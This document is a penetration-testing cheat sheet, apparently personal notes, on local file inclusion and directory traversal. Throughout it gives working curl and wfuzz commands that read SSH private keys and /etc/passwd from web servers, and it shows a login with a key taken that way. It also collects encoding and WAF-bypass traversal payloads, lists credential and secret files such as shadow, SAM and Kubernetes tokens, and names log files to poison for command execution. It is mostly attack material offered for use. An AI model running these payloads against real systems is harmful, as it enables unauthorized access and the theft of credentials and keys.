## LFI Keys to look for:
```
Keys:
/home//.ssh/id_rsa
/home//.ssh/id_ed25519
/home/$USER/.ssh/id_rsa
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
```

## Example LFI to keygrab
```
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
kali@kali:~$ chmod 400 dt_key
kali@kali:~$ ssh -i dt_key -p 2222 user@valleys.com
```

## Fuzzing
```
LFI file lists
Linux LFI file directories
https://github.com/hussein98d/LFI-files

Then use the list to find out which ones work:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt

Find out how many characters a wrong request is, then filter those out:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
```

### Directory Traversal
```
    - look in url for “file=<file>” in the url
    - Change “file” to a new file like c:\windows\system32\drivers\etc\hosts
    
Null byte, bypass to view files
    > vuln.php?page=/etc/passwd%00
    > vuln.php?page=/etc/passwd%2500

Windows hosts file
Let's change the parameter value to c:\windows\system32\drivers\etc\hosts and submit the URL:
http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
    
Basic Path Traversal    
http://valleys.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa -- Curl is better for grabbing private keys, formatting. 

kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

## Encoding special characters
```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ = ../../../../../../../../../../
%2e%2e/ = ../../
```

## cgi-bin exploit
```
curl --silent --path-as-is --insecure -k "target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

## Encoding
```
%2e%2e%2f = ../  <-- URL Encoded
%252e%252e%252f = ../  <-- Double URL encoded
%c0%ae%c0%ae%c0%af = ../  <-- UTF-8 Unicode Encoding
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

16 bits Unicode encoding
. = %u002e
/ = %u2215
\ = %u2216

UTF-8 Unicode encoding
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

## ../ Concatenation
```
Bypass "../" replaced by "" concatenation
Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
..././
...\.\
```

## Bypass "../" with ";"
```
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
```

## Double URL encoding
```
. = %252e
/ = %252f
\ = %255c

e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

## NGINX/ALB Bypass
```
NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request.
To bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../
```

## Java Bypass
```
Bypass Java's URL protocol
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## Interesting Linux files
```
Linux:
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```

## Interesting Windows files
```
Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside...
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt

Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

## Log Poisoning
```
The following log files are controllable and can be included with an evil payload to achieve a command execution

/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

